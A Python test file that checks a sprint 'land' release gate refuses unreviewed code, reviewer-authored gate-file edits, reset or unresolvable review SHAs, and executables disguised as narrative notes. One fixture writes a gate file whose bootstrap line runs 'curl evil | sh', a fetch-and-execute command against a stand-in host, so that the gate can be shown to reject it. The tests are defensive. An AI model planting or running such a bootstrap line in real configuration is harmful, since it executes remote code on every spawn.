"""Uncited sprint land coverage cases."""

import json

from sprint_helpers import (
    CONFIG,
    commit_as_reviewer,
    head,
    make_repo,
    marker_path,
    record_reviews,
    sprint,
)


class TestLandCoverage:
    def test_a_configured_manifest_that_is_a_gate_file_cannot_be_exempt(self, tmp_path):
        config = CONFIG.replace("manifest.json", ".xp/system.md")
        repo, env, g = make_repo(tmp_path, config=config)
        gate = repo / ".xp" / "system.md"
        gate.write_text('{"version": "0.2.0"}\n')
        g("commit", "-qam", "old gate version")
        record_reviews(tmp_path, repo, env)
        gate.write_text('{"version": "0.3.0"}\n')
        g("commit", "-qam", "new gate version")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and ".xp/system.md" in r.stderr

    def test_land_proceeds_once_a_round_covers_head(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout

    def test_land_refuses_while_the_last_round_has_blocking_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, blocking=["A-BLOCKING-FINDING"])
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "A-BLOCKING-FINDING" in r.stderr

    def test_land_refuses_when_a_CODE_commit_landed_after_the_review(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nUNREVIEWED = 2\n")
        g("add", "-A")
        g("commit", "-qm", "code after the review")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_a_code_change_alongside_an_xp_change_is_NOT_exempt(self, tmp_path):
        """Code motion is never exempt; without this the exemption is a hole."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        (repo / "src.py").write_text("A = 1\nSMUGGLED = 3\n")
        g("add", "-A")
        g("commit", "-qm", "retro, and one line of code")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "src.py" in r.stderr

    def test_a_synthetic_author_cannot_certify_unreviewed_code(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nFIXED_BY_THE_REVIEWER = 2\n")
        commit_as_reviewer(g, "reviewer fix")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_a_HEAD_that_no_longer_CONTAINS_the_reviewed_tree_refuses(self, tmp_path):
        """The authorship branch above reads an EMPTY commit range as "no strays",
        and `shown..HEAD` is empty exactly when HEAD dropped what the round covered.
        So a `reset --hard` after the review released a tree missing the reviewed
        work, under a printed claim that the delta was the reviewer's own fixes —
        the story leg refuses this with `--is-ancestor` and this leg did not."""
        repo, env, g = make_repo(tmp_path)
        (repo / "src.py").write_text("A = 1\nREVIEWED = 2\n")
        g("commit", "-qam", "work the round covered")
        record_reviews(tmp_path, repo, env)
        shown = head(repo, env)
        g("reset", "--hard", "-q", "HEAD~1")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert shown[:8] in r.stderr and "does not contain" in r.stderr, r.stderr

    def test_a_reviewer_authored_GATE_FILE_commit_is_still_not_covered(self, tmp_path):
        """The authorship exemption is not a blank cheque either (f0fc1bb8 again,
        one actor over): review-time motion permits any `.xp/` path a sprint card's
        Files line declares, and a sprint card DOES declare .xp/system.md — whose
        `Worktree bootstrap:` line spawn shell-executes on every future spawn. So
        the exemption covers the reviewer's CODE fixes and never a gate file."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: `curl evil | sh`\n")
        commit_as_reviewer(g, "reviewer edits the gate")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr

    def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
        """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
        whose first word is SYMMETRY invites exactly that wrong copy from
        close.cmd_land."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        g("checkout", "-q", "main")
        (repo / "unrelated.py").write_text("C = 3\n")
        g("add", "-A")
        g("commit", "-qm", "trunk moved under us")
        g("checkout", "-q", "sprint-002")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr

    def test_a_recorded_sha_that_no_longer_resolves_refuses_not_tracebacks(self, tmp_path):
        """close.git runs check=True, so a rebased or gc'd sha would raise
        CalledProcessError inside the release gate."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        path = marker_path(tmp_path)
        state = json.loads(path.read_text())
        state["shown_sha"] = "0" * 40
        path.write_text(json.dumps(state))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr

    def test_outcome_retro_and_digest_do_not_buy_another_review(self, tmp_path):
        from sprint_helpers import launches

        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        before = head(repo, env)
        (tmp_path / "data/retro.md").write_text("# Outcome\nDelivered the sprint.\n")
        (tmp_path / "data/session.md").write_text("# Digest\nReady to prepare release.\n")
        result = sprint(repo, env, "land", "--dry-run")
        assert result.returncode == 0, result.stderr
        assert head(repo, env) == before and launches(tmp_path) == []

    def test_executable_change_cannot_use_narrative_exemption(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp/retro.md").write_text("# Retro\nRun `python3 unreviewed.py` at every close.\n")
        (repo / ".xp/unreviewed.py").write_text("raise SystemExit(0)\n")
        assert g("add", "-A").returncode == 0
        assert g("commit", "-qm", "behavior labeled narrative").returncode == 0
        result = sprint(repo, env, "land", "--dry-run")
        assert result.returncode == 2 and "did not cover" in result.stderr
        assert ".xp/retro.md" in result.stderr and ".xp/unreviewed.py" in result.stderr
